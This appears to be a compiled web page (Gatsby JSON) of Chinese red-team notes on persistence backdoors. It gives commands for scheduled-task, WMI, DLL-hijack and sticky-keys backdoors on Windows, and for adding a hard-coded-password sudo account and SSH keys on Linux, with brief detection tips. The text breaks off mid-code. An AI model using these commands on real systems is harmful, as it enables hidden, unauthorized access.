{"componentChunkName":"component---src-templates-doc-js","path":"/hw/os-shell/","result":{"data":{"mdx":{"id":"9f30d73d-bc54-5a14-80cc-c45610585a4e","wordCount":{"words":132},"fields":{"slug":"/hw/os-shell/"},"excerpt":"Windows Schtasks后门 Schtasks.exe能够在本地或远程计算机上创建，删除，查询，更改，运行和结束计划任务 不带参数运行Schtasks.exe会显示每个已注册任务的状态和下一次运行时间。 Empire中的模块 一个开源工具：  https://github…","body":"function _extends() { _extends = Object.assign || function (target) { for (var i = 1; i < arguments.length; i++) { var source = arguments[i]; for (var key in source) { if (Object.prototype.hasOwnProperty.call(source, key)) { target[key] = source[key]; } } } return target; }; return _extends.apply(this, arguments); }\n\nfunction _objectWithoutProperties(source, excluded) { if (source == null) return {}; var target = _objectWithoutPropertiesLoose(source, excluded); var key, i; if (Object.getOwnPropertySymbols) { var sourceSymbolKeys = Object.getOwnPropertySymbols(source); for (i = 0; i < sourceSymbolKeys.length; i++) { key = sourceSymbolKeys[i]; if (excluded.indexOf(key) >= 0) continue; if (!Object.prototype.propertyIsEnumerable.call(source, key)) continue; target[key] = source[key]; } } return target; }\n\nfunction _objectWithoutPropertiesLoose(source, excluded) { if (source == null) return {}; var target = {}; var sourceKeys = Object.keys(source); var key, i; for (i = 0; i < sourceKeys.length; i++) { key = sourceKeys[i]; if (excluded.indexOf(key) >= 0) continue; target[key] = source[key]; } return target; }\n\n/* @jsx mdx */\nvar _frontmatter = {\n  \"title\": \"【红队】权限维持之--系统后门\"\n};\nvar layoutProps = {\n  _frontmatter: _frontmatter\n};\nvar MDXLayout = \"wrapper\";\nreturn function MDXContent(_ref) {\n  var components = _ref.components,\n      props = _objectWithoutProperties(_ref, [\"components\"]);\n\n  return mdx(MDXLayout, _extends({}, layoutProps, props, {\n    components: components,\n    mdxType: \"MDXLayout\"\n  }), mdx(\"h1\", null, \"Windows\", mdx(\"a\", _extends({\n    parentName: \"h1\"\n  }, {\n    \"className\": \"anchor\",\n    \"id\": \"windows\"\n  })), mdx(\"a\", _extends({\n    parentName: \"h1\"\n  }, {\n    \"href\": \"#windows\",\n    \"aria-label\": \"windows permalink\",\n    \"className\": \"anchorLink after\"\n  }), mdx(\"svg\", _extends({\n    parentName: \"a\"\n  }, {\n    \"aria-hidden\": \"true\",\n    \"focusable\": \"false\",\n    \"height\": \"16\",\n    \"version\": \"1.1\",\n    \"viewBox\": \"0 0 16 16\",\n    \"width\": \"16\"\n  }), mdx(\"path\", _extends({\n    parentName: \"svg\"\n  }, {\n    \"fillRule\": \"evenodd\",\n    \"d\": \"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\n  }))))), mdx(\"h2\", null, \"Schtasks\\u540E\\u95E8\", mdx(\"a\", _extends({\n    parentName: \"h2\"\n  }, {\n    \"className\": \"anchor\",\n    \"id\": \"schtasks后门\"\n  })), mdx(\"a\", _extends({\n    parentName: \"h2\"\n  }, {\n    \"href\": \"#schtasks%E5%90%8E%E9%97%A8\",\n    \"aria-label\": \"schtasks后门 permalink\",\n    \"className\": \"anchorLink after\"\n  }), mdx(\"svg\", _extends({\n    parentName: \"a\"\n  }, {\n    \"aria-hidden\": \"true\",\n    \"focusable\": \"false\",\n    \"height\": \"16\",\n    \"version\": \"1.1\",\n    \"viewBox\": \"0 0 16 16\",\n    \"width\": \"16\"\n  }), mdx(\"path\", _extends({\n    parentName: \"svg\"\n  }, {\n    \"fillRule\": \"evenodd\",\n    \"d\": \"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\n  }))))), mdx(\"p\", null, \"Schtasks.exe\\u80FD\\u591F\\u5728\\u672C\\u5730\\u6216\\u8FDC\\u7A0B\\u8BA1\\u7B97\\u673A\\u4E0A\\u521B\\u5EFA\\uFF0C\\u5220\\u9664\\uFF0C\\u67E5\\u8BE2\\uFF0C\\u66F4\\u6539\\uFF0C\\u8FD0\\u884C\\u548C\\u7ED3\\u675F\\u8BA1\\u5212\\u4EFB\\u52A1\"), mdx(\"p\", null, \"\\u4E0D\\u5E26\\u53C2\\u6570\\u8FD0\\u884CSchtasks.exe\\u4F1A\\u663E\\u793A\\u6BCF\\u4E2A\\u5DF2\\u6CE8\\u518C\\u4EFB\\u52A1\\u7684\\u72B6\\u6001\\u548C\\u4E0B\\u4E00\\u6B21\\u8FD0\\u884C\\u65F6\\u95F4\\u3002\"), mdx(\"p\", null, mdx(\"strong\", {\n    parentName: \"p\"\n  }, \"Empire\\u4E2D\\u7684\\u6A21\\u5757\")), mdx(\"div\", {\n    \"className\": \"gatsby-highlight\",\n    \"data-language\": \"bash\"\n  }, mdx(\"pre\", _extends({\n    parentName: \"div\"\n  }, {\n    \"style\": {\n      \"counterReset\": \"linenumber NaN\"\n    },\n    \"className\": \"language-bash line-numbers\"\n  }), mdx(\"code\", _extends({\n    parentName: \"pre\"\n  }, {\n    \"className\": \"language-bash\"\n  }), \"persistence/userland/schtasks\\npersistence/elevated/schtasks*\\t\\t\", mdx(\"span\", _extends({\n    parentName: \"code\"\n  }, {\n    \"className\": \"token comment\"\n  }), \"#\\u9700\\u8981\\u7BA1\\u7406\\u5458\\u6743\\u9650\")), mdx(\"span\", _extends({\n    parentName: \"pre\"\n  }, {\n    \"aria-hidden\": \"true\",\n    \"className\": \"line-numbers-rows\",\n    \"style\": {\n      \"whiteSpace\": \"normal\",\n      \"width\": \"auto\",\n      \"left\": \"0\"\n    }\n  }), mdx(\"span\", {\n    parentName: \"span\"\n  }), mdx(\"span\", {\n    parentName: \"span\"\n  })))), mdx(\"p\", null, \"\\u4E00\\u4E2A\\u5F00\\u6E90\\u5DE5\\u5177\\uFF1A \", mdx(\"a\", _extends({\n    parentName: \"p\"\n  }, {\n    \"href\": \"https://github.com/fireeye/SharPersist\"\n  }), \"https://github.com/fireeye/SharPersist\"), \" \"), mdx(\"h2\", null, \"wmi\\u540E\\u95E8\", mdx(\"a\", _extends({\n    parentName: \"h2\"\n  }, {\n    \"className\": \"anchor\",\n    \"id\": \"wmi后门\"\n  })), mdx(\"a\", _extends({\n    parentName: \"h2\"\n  }, {\n    \"href\": \"#wmi%E5%90%8E%E9%97%A8\",\n    \"aria-label\": \"wmi后门 permalink\",\n    \"className\": \"anchorLink after\"\n  }), mdx(\"svg\", _extends({\n    parentName: \"a\"\n  }, {\n    \"aria-hidden\": \"true\",\n    \"focusable\": \"false\",\n    \"height\": \"16\",\n    \"version\": \"1.1\",\n    \"viewBox\": \"0 0 16 16\",\n    \"width\": \"16\"\n  }), mdx(\"path\", _extends({\n    parentName: \"svg\"\n  }, {\n    \"fillRule\": \"evenodd\",\n    \"d\": \"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\n  }))))), mdx(\"p\", null, \"WMI\\u540E\\u95E8\\u4F7F\\u7528\\u4E86WMI\\u7684\\u4E24\\u4E2A\\u7279\\u5F81\\uFF1A\", mdx(\"strong\", {\n    parentName: \"p\"\n  }, \"\\u65E0\\u6587\\u4EF6\"), \"\\u548C\", mdx(\"strong\", {\n    parentName: \"p\"\n  }, \"\\u65E0\\u8FDB\\u7A0B\"), \"\\uFF08\\u9700\\u8981\\u7BA1\\u7406\\u5458\\u6743\\u9650\\u8FD0\\u884C\\uFF09\\u3002\"), mdx(\"p\", null, mdx(\"strong\", {\n    parentName: \"p\"\n  }, \"\\u539F\\u7406\\u662F\"), \"\\uFF1A\\u5C06\\u4EE3\\u7801\\u52A0\\u5BC6\\u5B58\\u50A8\\u4E0EWMI\\u4E2D\\uFF0C\\u5373\\u65E0\\u6587\\u4EF6\\uFF1B\\u8C03\\u7528PowerShell\\u6267\\u884C\\u540E\\u95E8\\u7A0B\\u5E8F\\uFF0C\\u6267\\u884C\\u540E\\u8FDB\\u7A0B\\u6D88\\u5931\\uFF0C\\u5373\\u65E0\\u8FDB\\u7A0B\\u3002\"), mdx(\"p\", null, mdx(\"strong\", {\n    parentName: \"p\"\n  }, \"\\u5728Empire\\u4E2D\\u4F7F\\u7528Invoke-WMI\\u6A21\\u5757\")), mdx(\"div\", {\n    \"className\": \"gatsby-highlight\",\n    \"data-language\": \"bash\"\n  }, mdx(\"pre\", _extends({\n    parentName: \"div\"\n  }, {\n    \"style\": {\n      \"counterReset\": \"linenumber NaN\"\n    },\n    \"className\": \"language-bash line-numbers\"\n  }), mdx(\"code\", _extends({\n    parentName: \"pre\"\n  }, {\n    \"className\": \"language-bash\"\n  }), \"usemodule powershell/persistence/elevated/wmi\\t\", mdx(\"span\", _extends({\n    parentName: \"code\"\n  }, {\n    \"className\": \"token comment\"\n  }), \"#\\u8BBE\\u7F6E\\u53C2\\u6570run\")), mdx(\"span\", _extends({\n    parentName: \"pre\"\n  }, {\n    \"aria-hidden\": \"true\",\n    \"className\": \"line-numbers-rows\",\n    \"style\": {\n      \"whiteSpace\": \"normal\",\n      \"width\": \"auto\",\n      \"left\": \"0\"\n    }\n  }), mdx(\"span\", {\n    parentName: \"span\"\n  })))), mdx(\"blockquote\", null, mdx(\"p\", {\n    parentName: \"blockquote\"\n  }, mdx(\"strong\", {\n    parentName: \"p\"\n  }, \"\\u68C0\\u67E5\\u540E\\u95E8\\uFF1A\"), \"\\u4F7F\\u7528\\u5FAE\\u8F6F\\u63D0\\u4F9B\\u7684\\u5DE5\\u5177\", mdx(\"code\", _extends({\n    parentName: \"p\"\n  }, {\n    \"className\": \"language-text\"\n  }), \"Autoruns\"), \"\\uFF1A\"), mdx(\"p\", {\n    parentName: \"blockquote\"\n  }, mdx(\"a\", _extends({\n    parentName: \"p\"\n  }, {\n    \"href\": \"https://docs.microsoft.com/en-us/sysinternals/downloads/autoruns\"\n  }), \"https://docs.microsoft.com/en-us/sysinternals/downloads/autoruns\"), \" \")), mdx(\"h2\", null, \"DLL\\u52AB\\u6301\\u540E\\u95E8\", mdx(\"a\", _extends({\n    parentName: \"h2\"\n  }, {\n    \"className\": \"anchor\",\n    \"id\": \"dll劫持后门\"\n  })), mdx(\"a\", _extends({\n    parentName: \"h2\"\n  }, {\n    \"href\": \"#dll%E5%8A%AB%E6%8C%81%E5%90%8E%E9%97%A8\",\n    \"aria-label\": \"dll劫持后门 permalink\",\n    \"className\": \"anchorLink after\"\n  }), mdx(\"svg\", _extends({\n    parentName: \"a\"\n  }, {\n    \"aria-hidden\": \"true\",\n    \"focusable\": \"false\",\n    \"height\": \"16\",\n    \"version\": \"1.1\",\n    \"viewBox\": \"0 0 16 16\",\n    \"width\": \"16\"\n  }), mdx(\"path\", _extends({\n    parentName: \"svg\"\n  }, {\n    \"fillRule\": \"evenodd\",\n    \"d\": \"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\n  }))))), mdx(\"p\", null, \"DLL\\u52AB\\u6301\\u539F\\u7406\\u5C31\\u662F\\u4F7F\\u7528 \", mdx(\"code\", _extends({\n    parentName: \"p\"\n  }, {\n    \"className\": \"language-text\"\n  }), \"loadlibrary\"), \" \\u52A8\\u6001\\u52A0\\u8F7DDLL\"), mdx(\"p\", null, \"DLL\\u52AB\\u6301\\u5DE5\\u5177\\uFF1A\", mdx(\"a\", _extends({\n    parentName: \"p\"\n  }, {\n    \"href\": \"https://github.com/anhkgg/SuperDllHijack\"\n  }), \"SuperDllHijack\")), mdx(\"h2\", null, \"\\u6620\\u50CF\\u52AB\\u6301shift\\u540E\\u95E8\", mdx(\"a\", _extends({\n    parentName: \"h2\"\n  }, {\n    \"className\": \"anchor\",\n    \"id\": \"映像劫持shift后门\"\n  })), mdx(\"a\", _extends({\n    parentName: \"h2\"\n  }, {\n    \"href\": \"#%E6%98%A0%E5%83%8F%E5%8A%AB%E6%8C%81shift%E5%90%8E%E9%97%A8\",\n    \"aria-label\": \"映像劫持shift后门 permalink\",\n    \"className\": \"anchorLink after\"\n  }), mdx(\"svg\", _extends({\n    parentName: \"a\"\n  }, {\n    \"aria-hidden\": \"true\",\n    \"focusable\": \"false\",\n    \"height\": \"16\",\n    \"version\": \"1.1\",\n    \"viewBox\": \"0 0 16 16\",\n    \"width\": \"16\"\n  }), mdx(\"path\", _extends({\n    parentName: \"svg\"\n  }, {\n    \"fillRule\": \"evenodd\",\n    \"d\": \"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\n  }))))), mdx(\"p\", null, mdx(\"strong\", {\n    parentName: \"p\"\n  }, \"\\u66FF\\u6362sethc.exe\\u4E3Acmd.exe\")), mdx(\"div\", {\n    \"className\": \"gatsby-highlight\",\n    \"data-language\": \"text\"\n  }, mdx(\"pre\", _extends({\n    parentName: \"div\"\n  }, {\n    \"style\": {\n      \"counterReset\": \"linenumber NaN\"\n    },\n    \"className\": \"language-text line-numbers\"\n  }), mdx(\"code\", _extends({\n    parentName: \"pre\"\n  }, {\n    \"className\": \"language-text\"\n  }), \"CD C:\\\\windows\\\\system32cacls sethc.exe /t /e /G Administrators:fcacls cmd.exe /t /e /G Administrators:fren sethc.exe aaa.exeren cmd.exe sethc.exe#\\u6062\\u590Dren sethc.exe cmd.exeren aaa.exe sethc.exe\"), mdx(\"span\", _extends({\n    parentName: \"pre\"\n  }, {\n    \"aria-hidden\": \"true\",\n    \"className\": \"line-numbers-rows\",\n    \"style\": {\n      \"whiteSpace\": \"normal\",\n      \"width\": \"auto\",\n      \"left\": \"0\"\n    }\n  }), mdx(\"span\", {\n    parentName: \"span\"\n  })))), mdx(\"p\", null, \"\\u8FDE\\u63095\\u4E0BShift\\u5F39\\u51FAcmd\\u7A97\\u53E3\"), mdx(\"blockquote\", null, mdx(\"p\", {\n    parentName: \"blockquote\"\n  }, mdx(\"strong\", {\n    parentName: \"p\"\n  }, \"\\u68C0\\u67E5\\u540E\\u95E8\"), \"\\uFF1A\\u8FDE\\u7EED\\u63095\\u4E0B\\u5F39\\u51FAcmd\\u7A97\\u53E3\\uFF08\\u5F53\\u7136\\u8FD8\\u6709\\u5176\\u5B83\\u653E\\u5927\\u955C\\u8BB2\\u8FF0\\u4EBA\\u7B49\\uFF09\")), mdx(\"p\", null, \"\\u6269\\u5C55\\uFF1A\", mdx(\"a\", _extends({\n    parentName: \"p\"\n  }, {\n    \"href\": \"https://mp.weixin.qq.com/s?__biz=MzU1NjgzOTAyMg==&mid=2247487783&idx=2&sn=cb335f8dca5b6581fc11586731f9497c&chksm=fc3fa826cb48213020f6a7099c77e20ced8dea3ec7168eaafbd61076e5926dfb50504a1440ef&mpshare=1&scene=24&srcid=0803CzkQaDB0wtkjHH15juEz&sharer_sharetime=1596415561771&sharer_shareid=e5c8ca04ed8346aa6eb2c2579c812fb8&key=ebb412db45555e1d108502328e33bc9c942962e3758fffe56ea4b145cd5a40482e5c11095d5f4c0533bb5cda390e6b656c3173ab08b99f70f343d1a6556cead0ff62db0cbe4ebcc9eb2bff17e0f2063e&ascene=14&uin=MTUwNjgwNTkxMA%3D%3D&devicetype=Windows+10+x64&version=62090070&lang=zh_CN&exportkey=A%2FNthEySkLH2rBg28%2FoMtnk%3D&pass_ticket=lppPNqJhx8ZD573ypwsqgQ41%2F%2BJd%2B2avwvIfBnLfOjeNcQkihuzk3CgS%2F36Je%2Bnb\"\n  }), \"\\u6743\\u9650\\u7EF4\\u6301\\u4E4B\\u6253\\u9020\\u4E0D\\u4E00\\u6837\\u7684\\u6620\\u50CF\\u52AB\\u6301\\u540E\\u95E8\")), mdx(\"h1\", null, \"Linux\", mdx(\"a\", _extends({\n    parentName: \"h1\"\n  }, {\n    \"className\": \"anchor\",\n    \"id\": \"linux\"\n  })), mdx(\"a\", _extends({\n    parentName: \"h1\"\n  }, {\n    \"href\": \"#linux\",\n    \"aria-label\": \"linux permalink\",\n    \"className\": \"anchorLink after\"\n  }), mdx(\"svg\", _extends({\n    parentName: \"a\"\n  }, {\n    \"aria-hidden\": \"true\",\n    \"focusable\": \"false\",\n    \"height\": \"16\",\n    \"version\": \"1.1\",\n    \"viewBox\": \"0 0 16 16\",\n    \"width\": \"16\"\n  }), mdx(\"path\", _extends({\n    parentName: \"svg\"\n  }, {\n    \"fillRule\": \"evenodd\",\n    \"d\": \"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\n  }))))), mdx(\"h2\", null, \"\\u589E\\u52A0\\u8D85\\u7EA7\\u7528\\u6237\\u8D26\\u53F7\", mdx(\"a\", _extends({\n    parentName: \"h2\"\n  }, {\n    \"className\": \"anchor\",\n    \"id\": \"增加超级用户账号\"\n  })), mdx(\"a\", _extends({\n    parentName: \"h2\"\n  }, {\n    \"href\": \"#%E5%A2%9E%E5%8A%A0%E8%B6%85%E7%BA%A7%E7%94%A8%E6%88%B7%E8%B4%A6%E5%8F%B7\",\n    \"aria-label\": \"增加超级用户账号 permalink\",\n    \"className\": \"anchorLink after\"\n  }), mdx(\"svg\", _extends({\n    parentName: \"a\"\n  }, {\n    \"aria-hidden\": \"true\",\n    \"focusable\": \"false\",\n    \"height\": \"16\",\n    \"version\": \"1.1\",\n    \"viewBox\": \"0 0 16 16\",\n    \"width\": \"16\"\n  }), mdx(\"path\", _extends({\n    parentName: \"svg\"\n  }, {\n    \"fillRule\": \"evenodd\",\n    \"d\": \"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\n  }))))), mdx(\"blockquote\", null, mdx(\"p\", {\n    parentName: \"blockquote\"\n  }, mdx(\"strong\", {\n    parentName: \"p\"\n  }, \"\\u5982\\u679C\\u7CFB\\u7EDF\\u4E0D\\u5141\\u8BB8\", mdx(\"code\", _extends({\n    parentName: \"strong\"\n  }, {\n    \"className\": \"language-text\"\n  }), \"uid=0\"), \"\\u7684\\u7528\\u6237\\uFF08\", mdx(\"code\", _extends({\n    parentName: \"strong\"\n  }, {\n    \"className\": \"language-text\"\n  }), \"root\"), \"\\uFF09\\u8FDC\\u7A0B\\u767B\\u5F55\\uFF0C\\u53EF\\u4EE5\\u6DFB\\u52A0\\u4E00\\u4E2A\\u666E\\u901A\\u7528\\u6237\\uFF0C\\u5E76\\u5C06\\u5176\\u52A0\\u5165sudoers\"))), mdx(\"p\", null, mdx(\"strong\", {\n    parentName: \"p\"\n  }, \"\\u589E\\u52A0\\u7528\\u6237\")), mdx(\"div\", {\n    \"className\": \"gatsby-highlight\",\n    \"data-language\": \"bash\"\n  }, mdx(\"pre\", _extends({\n    parentName: \"div\"\n  }, {\n    \"style\": {\n      \"counterReset\": \"linenumber NaN\"\n    },\n    \"className\": \"language-bash line-numbers\"\n  }), mdx(\"code\", _extends({\n    parentName: \"pre\"\n  }, {\n    \"className\": \"language-bash\"\n  }), mdx(\"span\", _extends({\n    parentName: \"code\"\n  }, {\n    \"className\": \"token function\"\n  }), \"useradd\"), \" phP        \", mdx(\"span\", _extends({\n    parentName: \"code\"\n  }, {\n    \"className\": \"token comment\"\n  }), \"#\\u6DFB\\u52A0\\u8D26\\u6237\"), \"\\n\", mdx(\"span\", _extends({\n    parentName: \"code\"\n  }, {\n    \"className\": \"token builtin class-name\"\n  }), \"echo\"), \" qwesys514\", mdx(\"span\", _extends({\n    parentName: \"code\"\n  }, {\n    \"className\": \"token operator\"\n  }), \"!\"), \"Sec\", mdx(\"span\", _extends({\n    parentName: \"code\"\n  }, {\n    \"className\": \"token operator\"\n  }), \"|\"), mdx(\"span\", _extends({\n    parentName: \"code\"\n  }, {\n    \"className\": \"token function\"\n  }), \"passwd\"), \" --stdin phP\\t\", mdx(\"span\", _extends({\n    parentName: \"code\"\n  }, {\n    \"className\": \"token comment\"\n  }), \"#\\u8BBE\\u7F6E\\u5BC6\\u7801(\\u5BC6\\u7801\\u7B26\\u5408\\u8981\\u5BC6\\u7801\\u5F3A\\u5EA6\\u7B56\\u7565)\")), mdx(\"span\", _extends({\n    parentName: \"pre\"\n  }, {\n    \"aria-hidden\": \"true\",\n    \"className\": \"line-numbers-rows\",\n    \"style\": {\n      \"whiteSpace\": \"normal\",\n      \"width\": \"auto\",\n      \"left\": \"0\"\n    }\n  }), mdx(\"span\", {\n    parentName: \"span\"\n  }), mdx(\"span\", {\n    parentName: \"span\"\n  })))), mdx(\"p\", null, mdx(\"strong\", {\n    parentName: \"p\"\n  }, \"\\u4FEE\\u6539sudoers\\u8D4B\\u4E88sudo\\u6743\\u9650\")), mdx(\"div\", {\n    \"className\": \"gatsby-highlight\",\n    \"data-language\": \"bash\"\n  }, mdx(\"pre\", _extends({\n    parentName: \"div\"\n  }, {\n    \"style\": {\n      \"counterReset\": \"linenumber NaN\"\n    },\n    \"className\": \"language-bash line-numbers\"\n  }), mdx(\"code\", _extends({\n    parentName: \"pre\"\n  }, {\n    \"className\": \"language-bash\"\n  }), mdx(\"span\", _extends({\n    parentName: \"code\"\n  }, {\n    \"className\": \"token function\"\n  }), \"chmod\"), \" +w /etc/sudoers    \", mdx(\"span\", _extends({\n    parentName: \"code\"\n  }, {\n    \"className\": \"token comment\"\n  }), \"#\\u8D4B\\u4E88\\u5199\\u5165\\u6743\\u9650\"), \"\\n\", mdx(\"span\", _extends({\n    parentName: \"code\"\n  }, {\n    \"className\": \"token function\"\n  }), \"vi\"), \" /etc/sudoers\\n\\n\", mdx(\"span\", _extends({\n    parentName: \"code\"\n  }, {\n    \"className\": \"token comment\"\n  }), \"# Allow root to run any commands anywhere\"), \"\\nroot    \", mdx(\"span\", _extends({\n    parentName: \"code\"\n  }, {\n    \"className\": \"token assign-left variable\"\n  }), \"ALL\"), mdx(\"span\", _extends({\n    parentName: \"code\"\n  }, {\n    \"className\": \"token operator\"\n  }), \"=\"), mdx(\"span\", _extends({\n    parentName: \"code\"\n  }, {\n    \"className\": \"token punctuation\"\n  }), \"(\"), \"ALL\", mdx(\"span\", _extends({\n    parentName: \"code\"\n  }, {\n    \"className\": \"token punctuation\"\n  }), \")\"), \"     ALL\\nphP\\t\\t\", mdx(\"span\", _extends({\n    parentName: \"code\"\n  }, {\n    \"className\": \"token assign-left variable\"\n  }), \"ALL\"), mdx(\"span\", _extends({\n    parentName: \"code\"\n  }, {\n    \"className\": \"token operator\"\n  }), \"=\"), mdx(\"span\", _extends({\n    parentName: \"code\"\n  }, {\n    \"className\": \"token punctuation\"\n  }), \"(\"), \"ALL\", mdx(\"span\", _extends({\n    parentName: \"code\"\n  }, {\n    \"className\": \"token punctuation\"\n  }), \")\"), \"     ALL\\n\\n\", mdx(\"span\", _extends({\n    parentName: \"code\"\n  }, {\n    \"className\": \"token comment\"\n  }), \"#\\u5728root\\u4E0B\\u65B9\\uFF0C\\u6DFB\\u52A0sudo\\u7528\\u6237\"), \"\\n\", mdx(\"span\", _extends({\n    parentName: \"code\"\n  }, {\n    \"className\": \"token function\"\n  }), \"chmod\"), \" -w /etc/sudoers    \", mdx(\"span\", _extends({\n    parentName: \"code\"\n  }, {\n    \"className\": \"token comment\"\n  }), \"#\\u64A4\\u9500\\u5199\\u5165\\u6743\\u9650\")), mdx(\"span\", _extends({\n    parentName: \"pre\"\n  }, {\n    \"aria-hidden\": \"true\",\n    \"className\": \"line-numbers-rows\",\n    \"style\": {\n      \"whiteSpace\": \"normal\",\n      \"width\": \"auto\",\n      \"left\": \"0\"\n    }\n  }), mdx(\"span\", {\n    parentName: \"span\"\n  }), mdx(\"span\", {\n    parentName: \"span\"\n  }), mdx(\"span\", {\n    parentName: \"span\"\n  }), mdx(\"span\", {\n    parentName: \"span\"\n  }), mdx(\"span\", {\n    parentName: \"span\"\n  }), mdx(\"span\", {\n    parentName: \"span\"\n  }), mdx(\"span\", {\n    parentName: \"span\"\n  }), mdx(\"span\", {\n    parentName: \"span\"\n  }), mdx(\"span\", {\n    parentName: \"span\"\n  })))), mdx(\"p\", null, \"\\u8FD8\\u53EF\\u4EE5\\u4FEE\\u6539/etc/passwd\\u6587\\u4EF6\\uFF0C\\u628A\\u7528\\u6237uid\\u6539\\u4E3A0\\u3002\"), mdx(\"h2\", null, \"SSH\\u516C\\u94A5\\u65E0\\u5BC6\\u7801\\u767B\\u5F55\", mdx(\"a\", _extends({\n    parentName: \"h2\"\n  }, {\n    \"className\": \"anchor\",\n    \"id\": \"ssh公钥无密码登录\"\n  })), mdx(\"a\", _extends({\n    parentName: \"h2\"\n  }, {\n    \"href\": \"#ssh%E5%85%AC%E9%92%A5%E6%97%A0%E5%AF%86%E7%A0%81%E7%99%BB%E5%BD%95\",\n    \"aria-label\": \"ssh公钥无密码登录 permalink\",\n    \"className\": \"anchorLink after\"\n  }), mdx(\"svg\", _extends({\n    parentName: \"a\"\n  }, {\n    \"aria-hidden\": \"true\",\n    \"focusable\": \"false\",\n    \"height\": \"16\",\n    \"version\": \"1.1\",\n    \"viewBox\": \"0 0 16 16\",\n    \"width\": \"16\"\n  }), mdx(\"path\", _extends({\n    parentName: \"svg\"\n  }, {\n    \"fillRule\": \"evenodd\",\n    \"d\": \"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\n  }))))), mdx(\"div\", {\n    \"className\": \"gatsby-highlight\",\n    \"data-language\": \"bash\"\n  }, mdx(\"pre\", _extends({\n    parentName: \"div\"\n  }, {\n    \"style\": {\n      \"counterReset\": \"linenumber NaN\"\n    },\n    \"className\": \"language-bash line-numbers\"\n  }), mdx(\"code\", _extends({\n    parentName: \"pre\"\n  }, {\n    \"className\": \"language-bash\"\n  }), \"ssh-keygen -t rsa    \", mdx(\"span\", _extends({\n    parentName: \"code\"\n  }, {\n    \"className\": \"token comment\"\n  }), \"#\\u672C\\u673A\\u751F\\u6210rsa\\u516C\\u94A5\"), \"\\n\\n\", mdx(\"span\", _extends({\n    parentName: \"code\"\n  }, {\n    \"className\": \"token comment\"\n  }), \"#\\u628Aid_rsa.pub\\u5199\\u5165\\u670D\\u52A1\\u7AEF\\u7684authorized_keys\\u4E2D\"), 